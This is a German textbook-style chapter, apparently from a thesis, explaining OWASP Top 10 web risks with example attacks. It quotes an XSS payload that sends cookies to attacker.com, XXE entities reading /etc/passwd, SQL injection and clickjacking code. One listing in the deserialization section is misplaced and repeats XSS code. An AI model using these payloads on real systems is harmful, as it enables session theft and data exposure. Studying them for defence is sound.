\chapter{Sicherheitsrisiken von Webanwendungen}
\label{cha:k3}

Dieses Kapitel beschäftigt sich mit der Sicherheit von Webanwendungen und in diesem Zusammenhang mit deren Schwachstellen und Angriffen und Bedrohungen auf diese. Um die bestehenden Sicherheitsrisiken der Anwendung kritisch zu beäugen, wird versucht diverse Testmethoden einzuführen. OWASP versucht hiermit das Top-Ten-Projekt voranzutreiben und bei Organisationen dafür zu sorgen, dass die Präsenz und das Bewusstsein für Anwendungssicherheit gestärkt wird. Das Hauptaugenmerk liegt hierbei nicht auf der Entwicklung von vollständigen Anwendungssicherheitsprogrammen, sondern mehr darauf eine solide und notwendige Basis für die Anwendungssicherheit durch die Implementierung von Codierungsprinzipien und -praktiken zu schaffen.

\section{Schwachstellen}

Eine lückenlose Sicherheit ist in der IT kaum realisierbar, da jede verwendete Anwendung Schwachstellen beinhalten kann, die bis jetzt noch nicht gefunden wurden.

\subsection{OWASP Top 10 Risiken}

\subsubsection{Injection}

Injektion-Schwachstellen wie SQL-, NoSQL-, OS- und LDAP-Injection treten dann auf, wenn Daten, die als Teil einer Datenabfrage oder Teil eines Befehls von einem Interpreter bearbeitet werden, nicht vertrauenswürdig sind\cite[6]{owasp17top10}. Simple textbasierte Angriffe werden vom Angreifer versendet, mit dem Ziel die Syntax des Zielinterpreters zu missbrauchen. Wenn eine Anwendung nicht vertrauenswürdige Daten an einen Interpreter weiterleitet, können Injection-Schwachstellen auftreten. Dabei kann fast jede erdenkliche Datenquelle, auch interne Datenquellen, die Form eines Injection-Vektors annehmen. Sie sind besonders in veralteten Codes weit verbreitet. Man kann sie in SQL-, LDAP-, XPath und NoSQL-Anfragen, in Betriebssystembefehlen sowie in XML, SMTP-Headern, Parametern oder Ähnlichen finden. Eine Einfach Variante Injection-Schwachstellen zu entdecken ist es, eine Code-Prüfung durchzuführen. Mit Hilfe von externen Tests verhält es sich ein wenig schwieriger. Angreifer setzen dazu Scanner und Fuzzer ein. Folgen einer Injection können Datenverlust oder -verfälschung, Fehlen von Zurechenbarkeit oder Zugangssperren sein. Vollständige Systemübernahmen können im schlimmsten Fall folgen.\cite[7]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\

\textbf{\textit{Szenario 1}}:\\
Stellen Sie sich vor, ein Entwickler muss die Kontonummern und Salden für die aktuelle Benutzer-ID anzeigen\cite{vcinj16}:\\


\begin{LaTeXCode}[caption={SQL Abfrage Beispiel 1},captionpos=b, label=LaTeXCode:inj1][numbers=none]
String accountBalanceQuery = 
"SELECT accountNumber, balance FROM accounts WHERE account_owner_id = " 
+ request.getParameter("user_id");

try
{
	Statement statement = connection.createStatement();
	ResultSet rs = statement.executeQuery(accountBalanceQuery);
	while (rs.next()) {
		page.addTableRow(rs.getInt("accountNumber"), rs.getFloat("balance"));
	}
} catch (SQLException e) { ... }
\end{LaTeXCode}

Der Benutzer ist im Normalfall mit der ID 984 angemeldet und kann folgende URL besuchen:

\texttt{https://bankingwebsite/show\_balances?user\_id=984}

Dies bedeutet, dass accountBalanceQuery am Ende wie bei dem Listing \ref{LaTeXCode:inj2} aussehen würde.

\begin{LaTeXCode}[caption={Account Balance Query},captionpos=b, label=LaTeXCode:inj2][numbers=none]
SELECT accountNumber, balance FROM accounts WHERE account_owner_id = 984
\end{LaTeXCode}

Indem auf der Seite neue Zeilen hinzugefügt werden, wird dies an die Datenbank übergeben und die Konten und Salden für Benutzer 984 werden zurückgegeben damit sie angezeigt werden können.

Parameter \texttt{user\_id} kann von einem Angreifer so verändert werden, dass er wie bei der \ref{LaTeXCode:inj3} aufgefasst werden kann:

\begin{LaTeXCode}[caption={Parameter},captionpos=b, label=LaTeXCode:inj3][numbers=none]
0 OR 1=1
\end{LaTeXCode}

Und dies führt dazu;

\begin{LaTeXCode}[caption={Account Balance Query},captionpos=b, label=LaTeXCode:inj4][numbers=none]
SELECT accountNumber, balance FROM accounts WHERE account_owner_id = 0 OR 1=1
\end{LaTeXCode}

Durch die Übergabe der Abfrage \ref{LaTeXCode:inj4} an die Datenbank, werden alle von ihr gespeicherten Kontonummern und Salden zurückgegeben und auf der Seite werden allen hinzugefügten Zeilen angezeigt. Der Angreifer kennt somit nun die Kontonummern und Salden jeglicher Benutzer.

\subsubsection{Fehler in Authentifizierung und Session-Management}

Angreifer können Passwörter oder Session-Token offenlegen oder so ausnutzen, dass die Identität anderer Benutzer angenommen werden kann, wenn Anwendungsfunktionen, die die Authentifizierung und das Session-Management umsetzen, falsch implementiert werden.\cite[6]{owasp17top10}. Dabei können Angreifer Sicherheitslücken beim Session-Management oder der Authentifizierung (z.B. ungeschützte Nutzerkonten, Passwörter, Session-IDs) nutzen, um sich unautorisiert Zugang zu einer fremden Identität zu verschaffen. Authentifizierungs- und Session-Managemententwickler setzen oft auf eigene Lösungen, obwohl bekannt ist, dass dies besonders schwierig und individuelle Lösungen anfällig sind. Fehler bei der Wiedererkennung des Benutzers, bei Abmeldung und Passwortmanagement, bei Timeouts, Sicherheitsabfragen können beispielsweise auftreten. Das Auffinden dieser Fehler kann sehr schwierig sein, besonders wenn es sich um individuelle Implementierungen handelt. Solche Fehler können zur Kompromittierung von Benutzerkonten führen. Sobald ein Angreifer erfolgreich ist, ist er im Besitz sämtlicher Rechte des Angegriffenen - besonderes Augenmerk der Angreifer liegt hierbei auf privilegierten Zugängen \cite[8]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\

\textbf{\textit{Szenario 1:}}\\
 Eine Flugbuchungsanwendung fügt die Session-ID in die URL ein\cite[8]{owasp17top10}:\\


\texttt{http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?}

\texttt{dest=Hawaii}\\

Ein authentifizierter Anwender möchte dieses Angebot seinen Freunden mitteilen. Ohne zu wissen, dass er seine Session-ID verrät, versendet er den Link per E-Mail. Nutzen seine Freunde den Link, können sie seine Session sowie zum Beispiel seine Kreditkartendaten benutzen.\\

\textbf{\textit{Szenario 2:}}\\
 Anwendungs-Timeouts sind falsch konfiguriert. Ein Anwender benutzt einen öffentlichen PC, um die Anwendung aufzurufen. Anstatt die „Abmelden“-Funktion zu benutzen, schließt der Anwender nur den Browser. Der Browser ist auch eine Stunde später noch authentifiziert, wenn ein potentieller Angreifer ihn öffnet\cite[8]{owasp17top10}.\\

\subsubsection{Verlust der Vertraulichkeit sensibler Daten}

Viele Anwendungen bieten keinen ausreichenden Schutz für sensible Daten, wie Kreditkartendaten oder Zugangsinformationen, was Angreifer dazu verleiten kann diese ungeschützten Daten auszulesen oder zu modifizieren um dann weitere Straftaten, wie beispielsweise Kreditkartenbetrug, oder einen Identitätsdiebstahl in Angriff zu nehmen. Mit  Hilfe von Verschlüsselungen während des Speicherns oder der Übertragung von vertraulichen Daten kann zusätzlicher Schutz gewährleistet werden - vor allem beim Hoch- und Herunterladen von Daten mit einem Internetbrowser\cite[6]{owasp17top10}. Anstatt Verschlüsselungen selbst zu durchbrechen, stehlen Angreifer in der Regel lieber Schlüssel, stehlen Klartext vom Server oder durchführen Seiten-Angriffe. Fehlende Verschlüsselung vertraulicher Daten ist die häufigste Schwachstelle. Oftmals wird bei der Nutzung von Kryptographie mit schwachen Schlüsselerzeugungen und -verwaltungen, der Nutzung schwacher Algorithmen, insbesondere für das Password Hashing, gearbeitet. Das Finden von Browser Schwachstellen ist nicht sonderlich schwer, aber dafür schwer auszunutzen. Fehler kompromittieren regelmäßig vertrauliche Daten. Dabei handelt sich oft um sensitive Daten wie beispielsweise personenbezogene Daten, Benutzernamen und Passwörter oder Kreditkarteninformationen\cite[9]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\

\textbf{\textit{Szenario 1:}}\\

Eine Anwendung verschlüsselt Kreditkartendaten automatisch bei der Speicherung in einer Datenbank. Das bedeutet aber auch, dass durch SQL-Injection erlangte Kreditkartendaten in diesem Fall automatisch entschlüsselt werden. Besser wäre es wenn die Anwendung die Daten mit eine Public Key
verschlüsselt hätte und nur nachgelagerte Anwendungen und nicht die Webanwendung selbst die Daten mit dem Private Key entschlüsselt hätte\cite[9]{owasp17top10}.\\

\textbf{\textit{Szenario 2:}}\\

Eine Webseite schützt die authentisierten Seiten nicht mit SSL. Der Angreifer stiehlt das Sitzungscookie des Nutzers durch einfaches Mitlesen der Kommunikation (z.B. in einem offenen WLAN). Der Angreifer kann nun durch einfaches Wiedereinspielen dieses Cookies die Sitzung des Nutzers übernehmen und Zugriff auf die privaten Daten des Nutzers erlangen \cite[9]{owasp17top10}.

\subsubsection{XML External Entities (XXE)}

Viele ältere oder schlecht konfigurierte XML-Prozessoren werten externe Entitätsverweise in XML-Dokumenten aus. Wenn bei der Verarbeitung solcher Dokumente nicht aufgepasst wird, besteht das Risiko einer unberechtigten Befehlsausführung und somit der Verlust interner Informationen \cite[6]{owasp17top10}. Anfällige XML-Prozessoren können von Angreifern ausgenutzt werden, wenn sie XML-Dokumente hochladen oder feindliche Inhalte in ein XML-Dokument aufnehmen, um dabei schwache Codes, Abhängigkeiten oder Integrationen zu missbrauchen. Externe Entitäten sind standardmäßig bei vielen älteren XML-Prozessoren erlaubt. Dabei wird die Angabe einer externen Entität, eines URI, dereferenziert und während der XML-Verarbeitung ausgewertet. Static Application Security Testing kann dieses Problem durch Examinieren der Abhängigkeiten und der Konfiguration identifizieren. Dies kann dann verwendet werden, um eine Extraktion von Daten durchzuführen, eine Remote-Anforderung vom Server auszuführen, interne Systeme zu scannen, einen Denial-of-Service-Angriff durchzuführen sowie weitere Angriffe in Augenschein zu nehmen \cite[10]{owasp17top10}.

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\
Der Angreifer versucht, Daten vom Server zu extrahieren\cite[10]{owasp17top10}:\\

\begin{LaTeXCode}[caption={XML-Beispiel},captionpos=b, label=LaTeXCode:xxe1][numbers=none]
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>\&xxe;</foo>
\end{LaTeXCode}

\textbf{\textit{Szenario 2:}}\\
Das private Netzwerk des Servers wird von einem Angreifer getestet, indem er die obige Entity-Zeile wie folgt ändert\cite[10]{owasp17top10}:\\

\begin{LaTeXCode}[caption={XML-Beispiel 2},captionpos=b, label=LaTeXCode:xxe2][numbers=none]
<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
\end{LaTeXCode}

\textbf{\textit{Szenario 3:}}\\
Ein Angreifer versucht einen Denial-of-Service-Angriff, indem er eine möglicherweise endlose Datei einfügt\cite[10]{owasp17top10}:\\

\begin{LaTeXCode}[caption={XML-Beispiel 3},captionpos=b, label=LaTeXCode:xxe3][numbers=none]
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
\end{LaTeXCode}

\subsubsection{Broken Access Control}

Einschränkungen im Handlungsspielraum von authentifizierten Benutzern, werden häufig nicht konsequent und ordnungsgemäß durchgesetzt. Angreifer können diese Ungenauheiten oftmals ausnutzen, um auf nicht autorisierte Funktionen und Daten zugreifen zu können \cite[6]{owasp17top10}. Die Manipulation der für die Zugriffskontrolle notwendigen Elemente ist eine Kernkompetenz von Angreifern. Static Application Security Testing (SAST)-Tools sind in der Lage das Fehlen einer Zugriffskontrolle zu erkennen. Sie sind jedoch nicht in der Lage zu überprüfen, ob sie funktionsfähig ist, wenn sie doch vorhanden ist. Ohne automatisierte Erkennungen und wirkungsvolle Funktionstest von Entwicklern, bleiben Schwachstellen bei Zugriffskontrollen häufig bestehen. Die Erkennung solcher Kontrollen ist normalerweise weder für automatisierte statische noch für dynamische Tests geeignet. Die technische Auswirkung besteht darin, dass Angreifer sich als Benutzer oder Administrator maskieren, indem sie jegliche Datensätze erstellen, darauf zugreifen, aktualisieren oder gar löschen\cite[11]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\

Die Anwendung verwendet unverifizierte Daten in einem SQL-Aufruf, der auf Kontoinformationen zugreift\cite[11]{owasp17top10}:

\begin{LaTeXCode}[caption={Broken Access Control - Beispiel 1},captionpos=b, label=LaTeXCode:bac1][numbers=none]
pstmt.setString(1, request.getParameter(''acct''));
ResultSet results = pstmt.executeQuery( );
\end{LaTeXCode}

Ein Angreifer modifiziert einfach den \texttt{acct} Parameter im Browser, um die gewünschte Kontonummer zu senden. Wenn dies nicht ordnungsgemäß überprüft wurde, kann der Angreifer auf das Konto eines Benutzers zugreifen.\\

\texttt{http://example.com/app/accountInfo?acct=notmyacct}\\

\textbf{\textit{Szenario 2:}}\\

Ein Angreifer zwingt einfach zu Ziel-URLs. Für den Zugriff auf die Administrationsseite sind Administratorrechte erforderlich. Ein Fehler existiert dann, wenn ein nicht authentifizierter Benutzer auf eine Seite zugreifen kann. Wenn ein jemand, der kein Administrator ist auf die Verwaltungsseite zugreifen kann, ist dies ebenfalls ein Fehler\cite[11]{owasp17top10}.\\

\subsubsection{Sicherheitsrelevante Fehlkonfiguration}

Die höchste Priorität sollte die Festlegung und Umsetzung einer sicheren Konfiguration für Anwendungen, Frameworks, Applikations-, Web- und Datenbankserver sowie deren Plattformen sein. Außerdem müssen Sicherheitseinstellungen definiert, zweckmäßig verwendet und gepflegt werden, da Voreinstellungen meist wenig Sicherheit aufweisen und die Software muss in regelmäßigen Abständen aktualisiert werden \cite[6]{owasp17top10}. Die von Angreifern benutzten Standardkonten, inaktive Seiten, ungepatchte Fehler, ungeschützte Dateien und Verzeichnisse, helfen ihnen dabei unautorisierten Zugang oder auch Informationen über das Zielsystem zu gewinnen. Sicherheitsrelevante Fehlkonfigurationen können in der Anwendung, inkl. Plattform, Web- und Anwendungsserver, oder Datenbank in jeglichen Feldern vorkommen. Deshalb ist vor allem die Zusammenarbeit zwischen Entwicklern und Administratoren wichtig, denn nur so kann eine sichere Konfiguration aller Ebenen garantiert werden. Häufig fehlende Sicherheitspatches,
Fehlkonfigurationen, Standardkonten oder nicht benötigte Dienste können von automatisierten Scannern identifiziert werden. Diese Fehler ermöglichen den Angreifern häufig unautorisierten Zugriff auf Systemdaten oder -funktionalitäten können aber auch zur kompletten Kompromittierung des Zielsystems führen\cite[12]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\

Die Administratorkonsole mit Standardkonto wurde nicht entfernt sondern automatisch installiert. Wenn Angreifer dies in Erfahrung bringen, können sie sich über das Standardkonto anmelden und in das System eindringen\cite[12]{owasp17top10}.\\

\textbf{\textit{Szenario 2:}}\\

Directory Listings wurden nicht deaktiviert. Angreifer können so in den Besitz aller Dateien kommen. Sie laden alle existierenden Java-Klassen herunter,
dekompilieren diese und stellen einen schwerwiegenden Fehler in der Zugriffskontrolle fest\cite[12]{owasp17top10}.\\

\textbf{\textit{Szenario 3:}}\\

Durch die Konfiguration des Anwendungsservers können Stack Traces wieder zurück an den Benutzer gegeben werden. Somit können potentielle Fehler im Backend sichtbar gemacht werden. Angreifer nutzen zusätzliche Informationen in Fehlermeldungen aus\cite[12]{owasp17top10}.\\

\textbf{\textit{Szenario 4:}}\\

Bereits bekannte Sicherheitsschwachstellen bei vorinstallierten Beispielapplikationen im Applikationsserver können von Angreifern ausgenutzt werden um so den Server zu kompromittieren und Schaden zuzufügen\cite[12]{owasp17top10}.\\

\subsubsection{Cross-Site Scripting (XSS)}

Im Falle dass eine Anwendung nicht vertrauenswürdige Daten akzeptiert und ohne entsprechende Validierung oder Umkodierung an einen Webbrowser übermittelt, können XSS-Schwachstellen auftauchen. Durch XSS kann ein Angreifer Scriptcodes im Browser eines Opfers ausführen um mit Hilfe von dieses Scriptcodes Benutzersitzungen zu übernehmen, Inhalte von Seiten zu modifizieren oder den Benutzer auf nicht vertrauenswürdige Seiten umzuleiten\cite[6]{owasp17top10}. Die vom Angreifer gesendeten textbasierten Angriffsskripte missbrauchen die Eigenschaften des Browsers und fast jede Datenquelle kann einen Angriffsvektor beinhalten, auch interne Quellen wie beispielsweise Datenbanken. XSS Schwachstellen, die die am weitesten verbreitete Schwachstelle bei webbasierten Anwendungen darstellen, treten dann auf, wenn vom Benutzer eingegebene Daten ohne hinreichend validiert zu werden von der Anwendung eingegebene Daten übernimmt und Metazeichen als Text zu kodiert. Es gibt dabei drei Typen von XSS Schwachstellen:\\

\begin{itemize}
	\item Persistent
	\item nichtpersistent/reflektiert und
	\item DOM-basiert (lokal)
\end{itemize}

Die meisten XSS-Schwachstellen sind recht simpel mit Hilfe von Tests oder Code-Analysen zu erkennen\cite[13]{owasp17top10}.

Angreifer können durch die Ausführung von Skripten im Browser des Opfers die Session übernehmen, Webseiten verändern, andere Inhalte einfügen, Benutzer umleiten oder den Browser des Benutzers mit Malware infizieren\cite[13]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\

Um folgenden HTML-Code zu generieren übernimmt die Anwendung nicht vertrauenswürdige Daten, welche weder auf Gültigkeit geprüft werden\cite[13]{owasp17top10}:\\

\begin{LaTeXCode}[caption={XXS-Beispiel 1},captionpos=b, label=LaTeXCode:xxs1][numbers=none]
(String) page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";
\end{LaTeXCode}

Der Angreifer ändert den Parameter \texttt{CC} in seinem Browser auf:\\

\begin{LaTeXCode}[caption={XXS-Beispiel 2},captionpos=b, label=LaTeXCode:xxs2][numbers=none]
<script>document.location=
http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>
\end{LaTeXCode}

Somit wird die Session-ID des Benutzers an die Seite des Angreifers gesendet, so dass der Angreifer die Möglichkeit hat die aktuelle Benutzersession zu übernehmen. Angreifer können XSS auch benutzen, um jegliche CSRF-Abwehr der Anwendung zu umgehen\cite[13]{owasp17top10}.\\

\subsubsection{Unsichere Deserialisierung}

Unsichere Deserialisierung führt oftmals zur Remote-Code-Ausführung. Deserialisierungsfehler können zur Durchführung von Angirffen, wie zum Beispiel Wiedergabeangriffen, Injektionsangriffen oder auch Angriffen auf erweiterte Rechte führen, sogar wenn sie keine Remotecodeausführung mit sich bringen\cite[6]{owasp17top10}. Dadurch dass die Standard-Exploits selten ohne Änderungen oder Anpassungen des zugrunde liegenden Exploit-Codes funktionieren, ist die Ausnutzung der Deserialisierung recht schwer zu realisieren. Dieses Problem ist in den Top 10 enthalten und basiert nicht auf quantifizierbaren Daten, sondern auf einer Branchenumfrage. Einige Tools können Deserialisierungsfehler erkennen jedoch kann ohne menschliche Hilfestellungen kein Problem korrekt überprüft werden. Sobald Tools zur Identifizierung von Deserialisierungsfehlern entwickelt werden, werden wohl auch die Prävalenzdaten dazu steigen. Die Auswirkungen von Deserialisierungsfehlern sollten an dieser Stelle nicht unterschätzt werden, denn genau diese Fehler steigern die Möglichkeit Opfer von fatalen Remote-Code-Execution-Angriffen zu werden\cite[13]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\

Um ein \texttt{Super-Cookie} zu speichern, welches die Benutzer-ID, die Rolle, den Kennwort-Hash und den anderen Status des Benutzers enthält, verwendet ein PHP-Forum die PHP-Objektserialisierung\cite[13]{owasp17top10}:\\

\begin{LaTeXCode}[caption={Unsichere Deserialisierung - Beispiel 1},captionpos=b, label=LaTeXCode:ud1][numbers=none]
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
\end{LaTeXCode}

Der Angreifer ändert den Parameter \texttt{CC} in seinem Browser auf:\\

\begin{LaTeXCode}[caption={Unsichere Deserialisierung - Beispiel 2},captionpos=b, label=LaTeXCode:ud2][numbers=none]
	(String) page += "<input name='creditcard' type='TEXT'
	value='" + request.getParameter("CC") + "'>";
\end{LaTeXCode}

Um sich Administratorrechte zu geben, modifiziert ein Angreifer das serialisierte Objekt:\\

\begin{LaTeXCode}[caption={Unsichere Deserialisierung - Beispiel 3},captionpos=b, label=LaTeXCode:ud3][numbers=none]
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
\end{LaTeXCode}

\subsubsection{Nutzung von Komponenten mit bekannten Schwachstellen}

Bibliotheken, Frameworks oder andere Softwaremodule stellen Komponenten dar, die meistens mit vollen Berechtigungen ausgeführt werden können. Falls eine verwundbare Komponente missbraucht wird, kann ein solcher Angriff zu schwerwiegendem Datenverlust oder gar zu einer Serverübernahme führen. Applikationen, die den Einsatz von Komponenten mit bekannten Schwachstellen nutzen, können Schutzmaßnahmen umgehen und auf diesem Wege unzählige Angriffe und Auswirkungen möglich machen\cite[6]{owasp17top10}. Ein Angreifer kann Komponenten mit Schwachstellen mittels Scan oder manueller Analyse erkennen. Er passt den Exploit an und geht zum Angriff über. Bei tief eingebetteten Komponenten ist dies schwieriger. Dadurch dass die Mehrzahl der Entwicklungs-Teams kaum darauf achten, dass die benutzten Komponenten oder Bibliotheken aktuell sind, ist fast jede Anwendung von diesem Problem betroffen. Oft sind nicht einmal alle Komponenten bekannt oder sie machen sich keine Gedanken über die entsprechenden Versionen. Aufgrund der rekursives Abhängigkeit von weiteren Bibliotheken verschlechtert die Situation stetig. Eine Vielzahl von Schwachstellen können auftreten, inkl. Injection, Fehler in der Zugriffskontrolle oder beispielsweise XSS. Die Auswirkungen reichen von vernachlässigbaren Auswirkungen bis hin zur vollständigen Übernahme des Servers und der Daten\cite[15]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\

Von geringen Risiken bis hin zu ausgefeilter Malware - die durch Schwachstellen in Komponenten verursachten Lücken können zu allem führen, was für gerichtete Angriffe geeignet ist. Die Komponenten funktionieren im Normalfall mit allen Anwendungsrechten, dadurch entsteht ein Mange in jeder Komponente, was äußerst schwerwiegend sein kann\cite[15]{owasp17top10}.


\subsubsection{Insufficient Logging \& Monitoring}

Durch Insufficient Logging und Monitoring in Kombination mit fehlender oder ineffektiver Integration mit Vorfallreaktionen kann Angreifern ermöglicht werden, weitere Systeme zu attackieren und die Daten zu manipulieren, zu extrahieren oder zu beschädigen\cite[6]{owasp17top10}. Um ihre Ziele unentdeckt zu realisieren verlassen sich Angreifer auf das Fehlen von Überwachung und rechtzeitiger Reaktion. Eine mögliche Strategie, um zu bestimmen, ob Sie eine ausreichende Überwachung haben, ist es die Protokolle nach dem Durchdringungstest zu untersuchen. Um die Ursache der Schäden zu verstehen müssen die Handlungen der Tester ausreichend protokolliert werden. Die exakte Prüfung auf potenzielle Schwachstellen, bietet oft die Basis für erfolgversprechende Angriffe\cite[16]{owasp17top10}.\\

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\

Eine Open Source-Projektforumsoftware, welche durch ein kleines Team betrieben wurde, wurde mit einem Fehler in der Software gehackt. Den Angreifern war es möglich das interne Quellcode-Repository mit der nächsten Version und den gesamten Foreninhalt löschen. Das Fehlen von Überwachung, Protokollierung oder Alarmierung führt zu einem viel schlimmeren Verstoß, obwohl die Quelle wiederhergestellt werden konnte. Das Forumssoftwareprojekt ist aufgrund dieses Problems nicht mehr aktiv\cite[16]{owasp17top10}.\\

\textbf{\textit{Szenario 2:}}\\

Für Benutzer, die ein allgemeines Kennwort verwenden, verwendet der Angreifer entsprechende Scans. Sie können alle Konten mit diesem Passwort übernehmen. Alle anderen Benutzer erleben durch diesen Scan nur ein falsches Login. Dies kann nach einigen Tagen beliebig oft mit einem anderen Passwort wiederholt werden\cite[16]{owasp17top10}.\\

\subsection{Weitere Risiken}

Die OWASP Top 10 zeigt die zehn wichtigsten Risiken für Webanwendungen. Jedoch existieren noch diverse weitere Risiken, welche wichtige Rollen bei der Entwicklung und dem Betrieb von Webanwendungen spielen. Im folgenden Abschnitt werden weitere Risiken erläutert.

\subsubsection{Zugriff auf entfernte Dateien}

Wenn \texttt{allow\_url\_fopen} in der \texttt{php.ini} aktiviert ist, können HTTP- und FTP-URLs bei den meisten Funktionen, die einen Dateinamen als Parameter benötigen, verwendet werden. Außerdem können URLs in \texttt{include}-, \texttt{include\_once}- und \texttt{require}-Anweisungen verwendet werden. Exemplarisch kann damit eine Datei auf einem anderen Webserver erreicht und die benötigten Daten analysiert werden. Eben diese Daten können zur Abfrage einer Datenbank benutzt werden\cite{zaed08}.\\

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\

\begin{LaTeXCode}[caption={Den Titel einer entfernten Seite auslesen},captionpos=b, label=LaTeXCode:zaed1][numbers=none]
<?php
$datei = fopen ("http://www.example.com/", "r");
if (!$datei) {
	echo "<p>Datei konnte nicht geoeffnet werden.\n";
	exit;
}
while (!feof ($datei)) {
	$zeile = fgets ($datei, 1024);
	/* Funktioniert nur, wenn Titel und title-Tags in einer Zeile stehen */
	if (preg_match ("@\<title\>(.*)\</title\>@i", $zeile, $treffer)) {
		$title = $treffer[1];
		break;
	}
}
fclose($datei);
?>
\end{LaTeXCode}

Bei einer Anmeldung mit entsprechenden Zugriffsrechten seitens des Benutzers, kann eine Datei auf einem FTP-Server geschrieben werden. Auf diesem Weg können nur neue Dateien angelegt werden. Durch die Angabe eines Benutzernamens und möglicherweise eines Passworts innerhalb der URL wie z.B.\\
 \texttt{'ftp://benutzer:passwort@ftp.example.com/pfad/zur/datei'}\\
besteht die Möglichkeit sich nicht stets als 'anonymous' anzumelden. Mit Hilfe der selben Syntax kann man auf Dateien via HTTP zuzugreifen, wenn diese eine Basic-Authentifizierung erfordern\cite{zaed08}.\\

\subsubsection{Clickjacking}

Clickjacking nennt man den Versuch, einen Nutzer dazu zu bringen, auf schädliche Links zu klicken, von welchen man zunächst denkt, dass sich dahinter scheinbar harmlose Videos, Bilder oder Artikel verstecken. Über einen ''überlagerten'' Link können Nutzer auf infizierte Webseiten oder Spams geleitet werden. Durch Clickjacking kann man Nutzer sogar dazu bringen Werbung oder schädliche Inhalte auf seiner Social Media-Seite zu posten ohne sich dem bewusst zu sein\cite{cj16}.\\

\textbf{Mögliche Angriffsszenarien:}\\
\\
\textbf{\textit{Szenario 1:}}\\

Bei diesem HTML-Code gibt es nur ein Formular mit einem Absenden-Button. Durch das Verwenden dieses Buttons, wird die Aktion \texttt{dotransfer} ausgeführt, die dazu führt, dass der Benutzer zur Anschauung weitergeleitet wird\cite{cjd13}.\\


\begin{LaTeXCode}[caption={Opferseite},captionpos=b, label=LaTeXCode:cj1][numbers=none]
<html>
	<head>
	<title>Opferseite</title>
	</head>
	<body>
	<form action="/dotransfer" method="post" />
		<input type="hidden" value="1000" name="amount" />
		<input type="hidden" value="[RND-ID]" name="csrftoken" />
		<input type="submit" value="submit" />
	</form>
	</body>
</html>
\end{LaTeXCode}

Durch die weiter unten verfassten HTML-Codes wird eine zweite Seite erstellt, welche für die die Einbindung der ersten Seite sorgt\cite{cjd13};\\

\begin{LaTeXCode}[caption={Hackseite},captionpos=b, label=LaTeXCode:cj2][numbers=none]
<html>
	<head>
	<title>Hack</title>
	</head>
	<body>
		<button id="clickme"/>Gewinne ein Smartphone</button>
		<iframe src="http://opferseite.de/inittransfer.html" id="frame"/><iframe>
	</body>
</html>
\end{LaTeXCode}

Durch CSS ist es möglich das Iframe semi-transparent zu gestalten, und den \texttt{clickme} Button direkt über den Absenden-Button des Iframes zu legen\cite{cjd13}.\\

\begin{LaTeXCode}[caption={CSS},captionpos=b, label=LaTeXCode:cj3][numbers=none]
#clickme {
	position:absolute;
	top:0px;
	left:0px;
	color: #ff0000;
}

#frame {
	width: 100%;
	height: 100%;
	opacity: 0.5;
}
\end{LaTeXCode}

Das führt dazu, dass der Benutzer schlussendlich nur noch den Button mit der Aufschrift „Gewinn eines Smartphones“ sieht. Darüber liegt jedoch das transparente Iframe. Möchte der Benutzer seinen vermeintlichen Gewinn in Anspruch nehmen, betätigt er nicht den Gewinnbutton, sondern den Absenden-Button im Iframe. Damit wird die Aktion im Hintergrund ausgeführt, was vom Hacker genau so beabsichtigt war \cite{cjd13}.\\

\subsubsection{Remote File Upload}

Hochgeladene Dateien stellen ein erhebliches Risiko für Anwendungen dar. Der erste Schritt bei vielen Angriffen besteht darin, etwas Code in das System zu bringen, um angegriffen zu werden. Dann muss der Angriff nur einen Weg finden, um den Code auszuführen. Durch das Hochladen einer Datei kann der Angreifer den ersten Schritt ausführen. Die Folgen eines uneingeschränkten Hochladens von Dateien können unterschiedlich sein, einschließlich der vollständigen Übernahme des Systems, eines überlasteten Dateisystems oder einer Datenbank, Weiterleiten von Angriffen an Back-End-Systeme, clientseitigen Angriffen oder einer einfachen Defacementierung. Es hängt davon ab, was die Anwendung mit der hochgeladenen Datei macht und insbesondere, wo sie gespeichert wird. Hier gibt es wirklich zwei Arten von Problemen. Die erste enthält die Metadaten der Datei, wie Pfad und Dateiname. Diese werden im Allgemeinen vom Transport bereitgestellt, z. B. die mehrteilige HTTP-Kodierung. Diese Daten können dazu führen, dass die Anwendung eine kritische Datei überschreibt oder die Datei an einem falschen Ort speichert. Die andere Problemklasse betrifft die Dateigröße oder den Inhalt. Der Umfang der Probleme hängt dabei ganz davon ab, wofür die Datei verwendet wird\cite{fileremotevul18}. \\

\subsubsection{Pufferüberlauf (engl. Buffer Overflow)}

Eine Pufferüberlaufbedingung liegt vor, wenn ein Programm versucht, mehr Daten in einen Puffer einzufügen, als es halten kann, oder wenn ein Programm versucht, Daten in einem Speicherbereich hinter einem Puffer abzulegen. Das Schreiben außerhalb der Grenzen eines zugewiesenen Speicherblocks kann Daten beschädigen, das Programm zum Absturz bringen oder die Ausführung von schädlichem Code verursachen. 

